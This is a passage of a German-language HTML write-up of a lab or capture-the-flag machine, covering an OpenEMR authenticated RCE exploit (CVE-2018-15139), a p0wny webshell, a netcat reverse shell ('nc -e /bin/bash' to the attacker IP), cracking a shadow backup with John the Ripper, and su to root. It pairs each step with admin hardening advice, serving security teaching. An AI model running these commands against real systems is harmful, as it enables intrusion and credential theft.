+  / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /
+ | | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |  _____  |___ \| | | || |   |_ \
+ | |_| | |_) |  __/ | | | |___| | | | |  _ <  |_____|  ___) | |_| || |_ ___) |
+  \___/| .__/ \___|_| |_|_____|_|  |_|_| \_\         |____(_)___(_)_(_)____/
+       |_|
+
+                    _____            _       _ _
+                    | ____|_  ___ __ | | ___ (_) |_
+                    |  _| \ \/ / '_ \| |/ _ \| | __|
+                    | |___ >  <| |_) | | (_) | | |_
+                    |_____/_/\_\ .__/|_|\___/|_|\__|
+                               |_|
+
+
+[*] CVE-2018-15139 - OpenEMR <= 5.0.1.3 Authenticated RCE
+[*] Exploit by: Askar (@askarsyz)
+
+
+[+] Authentication successful!
+
+[+] Uploading Webshell...
+[+] Webshell uploaded successfully!
+
+[+] Webshell location: http://192.168.2.111:80//sites/default/images/shell.php
+[+] Happy Hacking! ;)
+
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die vom Exploit hochgeladene Webshell wird im Browser aufgerufen. Diese spezielle Webshell (`p0wny@shell`) bietet eine einfache Befehlsausführungsumgebung. Innerhalb der Webshell wird der Befehl `id` ausgeführt, der bestätigt, dass die Befehle als `www-data` laufen. Anschließend wird von der Webshell aus eine Netcat-Reverse-Shell zum Angreifer-Rechner (IP 192.168.2.129, Port 4444) gestartet. Auf dem Angreifer-Rechner wird mit `nc -lvnp 4444` auf die eingehende Verbindung gewartet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Zugriff über die Webshell und der Aufbau der Reverse Shell waren erfolgreich. Wir haben nun eine interaktive Shell als Benutzer `www-data` auf dem Zielsystem. Der initiale Zugriff ist somit vollständig gelungen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die Reverse Shell (z.B. mit Python PTY), falls nötig. Beginne mit der Enumeration des Systems als `www-data`, um Wege zur Privilege Escalation zu finden. Suche nach interessanten Dateien, Konfigurationen, SUID-Binaries und Cronjobs.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Neben der Aktualisierung von OpenEMR, implementieren Sie Dateisystem-Überwachung (File Integrity Monitoring), um unautorisierte Datei-Uploads (wie Webshells) zu erkennen. Härten Sie die PHP-Konfiguration, um gefährliche Funktionen zu deaktivieren und die Ausführung von Systembefehlen einzuschränken. Überwachen Sie ausgehende Netzwerkverbindungen vom Webserver.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+# Aufruf der Webshell im Browser:
+http://192.168.2.111//sites/default/images/shell.php
+
+# --- Ausgabe/Interaktion in der p0wny-Webshell ---
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">p0wny@shell:/var/www/html/sites/default/images# <span class="command">id</span></div>
+                    <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                    <div class="prompt" style="color: #ffffff;">p0wny@shell:/var/www/html/sites/default/images# <span class="command">whoami</span></div>
+                    <pre>www-data</pre>
+                    <div class="prompt" style="color: #ffffff;">p0wny@shell:/var/www/html/sites/default/images# <span class="command">nc -e /bin/bash 192.168.2.129 4444</span></div>
+                    <pre># (Keine Ausgabe hier, Verbindung wird aufgebaut)</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.129] from (UNKNOWN) [192.168.2.111] 35330
+<span class="command">id</span>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                    </pre>
+                     <!-- Hier beginnt die Reverse Shell -->
+                </div>
+            </div>
+        </section>
+
+         <section id="privilege-escalation">
+            <h2>Privilege Escalation (Password Cracking)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> In der Reverse Shell als `www-data` werden Enumerationsschritte zur Privilege Escalation durchgeführt.
+                *   `find / -user root -perm -4000 -print 2>/dev/null`: Sucht nach SUID-Dateien, die `root` gehören.
+                *   `which python3`, `which python`: Prüft die Verfügbarkeit von Python-Versionen.
+                *   Es wird eine Datei namens `shadow.backup` auf den Angreifer-Rechner heruntergeladen (der Befehl dazu fehlt, aber `wget` wird auf dem Angreifer ausgeführt). Diese Datei enthält vermutlich eine Kopie der `/etc/shadow`-Datei.
+                *   `cat shadow.backup`: Zeigt den Inhalt der Backup-Datei an. Sie enthält gehashte Passwörter für `root` und `clapton` (SHA512crypt, $6$).
+                *   `john --wordlist=/usr/share/wordlists/rockyou.txt shadow.backup`: Verwendet John the Ripper mit der `rockyou.txt`-Wortliste, um die Hashes in der `shadow.backup`-Datei zu knacken.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die SUID-Suche ergibt keine ungewöhnlichen oder leicht ausnutzbaren Binaries. Python ist verfügbar. Der entscheidende Fund ist die `shadow.backup`-Datei. Der Inhalt bestätigt, dass es sich um eine Kopie der Shadow-Datei handelt. John the Ripper ist erfolgreich und knackt die Passwörter für beide relevanten Benutzer:
+                *   `clapton`: `<span class="password">dragonsblood</span>`
+                *   `root`: `<span class="password">.:.yarak.:.</span>`
+                Dies ist der direkte Weg zur vollständigen Kompromittierung des Systems.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die gefundenen Passwörter, um dich mittels `su` als `clapton` und anschließend als `root` anzumelden und die jeweiligen Flags zu holen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Erstellen Sie niemals ungesicherte Backups von sensiblen Dateien wie `/etc/shadow`. Wenn Backups nötig sind, speichern Sie sie an einem sicheren Ort mit strengen Zugriffskontrollen und verschlüsseln Sie sie idealerweise. Erzwingen Sie starke, komplexe Passwörter, die nicht in gängigen Wortlisten wie `rockyou.txt` enthalten sind. Überwachen Sie das Dateisystem auf verdächtige oder fehlplatzierte sensible Dateien.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Befehle in der Reverse Shell (www-data) -->
+                    <div class="prompt" style="color: #ffffff;">$ <span class="command">find / -user root -perm -4000 -print 2>/dev/null</span></div>
+                    <pre>
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/chsh
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">$ <span class="command">which python3</span></div>
+                     <pre>/usr/bin/python3</pre>
+                     <div class="prompt" style="color: #ffffff;">$ <span class="command">which python</span></div>
+                     <pre>/usr/bin/python</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.111:8000/shadow.backup</span></div> <!-- Annahme: Datei wurde auf dem Ziel bereitgestellt -->
+                    <pre>
+--2023-04-16 03:15:22--  http://192.168.2.111:8000/shadow.backup
+Connecting to 192.168.2.111:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 943 [application/octet-stream]
+Saving to: ‘shadow.backup’
+
+shadow.backup           100%[===================>]     943  --.-KB/s    in 0.02s
+
+2023-04-16 03:15:22 (41.5 KB/s) - ‘shadow.backup’ saved [943/943]
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat shadow.backup</span></div>
+                    <pre>
+root:<span class="password">$6$sqBC8Bk02qmul3ER$kysvb1LR5uywwKRc/KQcmOMALcqd0NhHnU1Wbr9NRs9iz7WHwWqGkxKYRhadI3FWo3csX1BdQPHg33gwGVgMp.</span>:18742:0:99999:7:::
+daemon:*:18742:0:99999:7:::
+bin:*:18742:0:99999:7:::
+sys:*:18742:0:99999:7:::
+sync:*:18742:0:99999:7:::
+games:*:18742:0:99999:7:::
+man:*:18742:0:99999:7:::
+lp:*:18742:0:99999:7:::
+mail:*:18742:0:99999:7:::
+news:*:18742:0:99999:7:::
+uucp:*:18742:0:99999:7:::
+proxy:*:18742:0:99999:7:::
+www-data:*:18742:0:99999:7:::
+backup:*:18742:0:99999:7:::
+list:*:18742:0:99999:7:::
+irc:*:18742:0:99999:7:::
+gnats:*:18742:0:99999:7:::
+nobody:*:18742:0:99999:7:::
+_apt:*:18742:0:99999:7:::
+systemd-timesync:*:18742:0:99999:7:::
+systemd-network:*:18742:0:99999:7:::
+systemd-resolve:*:18742:0:99999:7:::
+messagebus:*:18742:0:99999:7:::
+systemd-coredump:!!:18742::::::
+mysql:!:18742:0:99999:7:::
+clapton:<span class="password">$6$/eeR7/4JGbeM7nwc$hANgsvO09hCCMkV5HiWsjTTS7NMOZ4tm8/s4uzyZxLau2CSX7eEwjgcbfwcdvLV.XccVW5QuysP/9JBjMkdXT/</span>:18742:0:99999:7:::
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt shadow.backup</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">dragonsblood</span>     (clapton)
+<span class="password">.:.yarak.:.</span>      (root)
+2g 0:00:00:05 DONE (2023-04-16 03:16) 0.3853g/s 1778Kp/s 1778Kc/s 1778KC/s *7¡Vamos! .. ***********
+Session completed
+                    </pre>
+                </div>
+            </div>
+         </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (Root Access via su)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit den durch John the Ripper geknackten Passwörtern wird nun der Zugriff auf die Benutzerkonten `clapton` und `root` erlangt. Dies geschieht innerhalb der bestehenden `www-data`-Reverse-Shell mittels des `su` (substitute user) Befehls.
+                1.  `su clapton`: Wechsel zum Benutzer `clapton`. Das Passwort `<span class="password">dragonsblood</span>` wird eingegeben.
+                2.  `id`, `pwd`, `cd /home/clapton`, `ls`, `cat user.txt`: Befehle werden als `clapton` ausgeführt, um den Zugriff zu bestätigen und das User-Flag zu lesen.
+                3.  `su root`: Wechsel zum Benutzer `root`. Das Passwort `<span class="password">.:.yarak.:.</span>` wird eingegeben.
+                4.  `id`, `cd /root`, `cat root.txt`: Befehle werden als `root` ausgeführt, um den Root-Zugriff zu bestätigen und das Root-Flag zu lesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Wechsel zu `clapton` und anschließend zu `root` mittels `su` und den geknackten Passwörtern war erfolgreich. Beide Flags wurden gefunden:
+                *   User-Flag: `<span class="password">96716B8151B1682C5285BC99DD4E95C2</span>`
+                *   Root-Flag: `<span class="password">E8E7040D825E1F345A617E0E6612444A</span>`
+                Das System ist vollständig kompromittiert. Der Proof of Concept für den Root-Zugriff ist erbracht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Das Ziel ist erreicht. Dokumentieren Sie die Schritte, insbesondere die Fundorte der Credentials (Admin-Login via ffuf, User/Root-Passwörter via John aus shadow.backup) und die gefundenen Flags.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die vorherigen Empfehlungen bezüglich Passwortsicherheit, Entfernung von Backup-Dateien und Härtung der Webanwendung sind entscheidend. Überprüfen Sie alle Benutzerkonten auf schwache Passwörter. Implementieren Sie starke Passwortrichtlinien und regelmäßige Passwort-Audits. Stellen Sie sicher, dass keine sensiblen Dateien wie `shadow.backup` im System herumliegen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.129] from (UNKNOWN) [192.168.2.111] 35332
+# --- Befehle in der Reverse Shell ---
+<span class="command">su clapton</span>
+Password: <span class="password">dragonsblood</span> # Passwort eingegeben
+<span class="command">id</span>
+uid=1000(clapton) gid=1000(clapton) groups=1000(clapton)
+<span class="command">pwd</span>
+/var/www/html/sites/default/images # Startverzeichnis der Webshell
+<span class="command">cd /home/clapton</span>
+<span class="command">ls</span>
+user.txt
+waytoroot
+wordlist.txt
+<span class="command">cat user.txt</span>
+<span class="password">96716B8151B1682C5285BC99DD4E95C2</span>
+<span class="command">su root</span>
+Password: <span class="password">.:.yarak.:.</span> # Passwort eingegeben
+<span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+<span class="command">cd /root</span>
+<span class="command">ls</span>
+root.txt
+<span class="command">cat root.txt</span>
+<span class="password">E8E7040D825E1F345A617E0E6612444A</span>
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+       <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">96716B8151B1682C5285BC99DD4E95C2</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">E8E7040D825E1F345A617E0E6612444A</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 16. April 2023</p> <!-- Extrahiertes Datum aus Nmap/Hashcat/John -->
+    </footer>
+</body>
+</html>
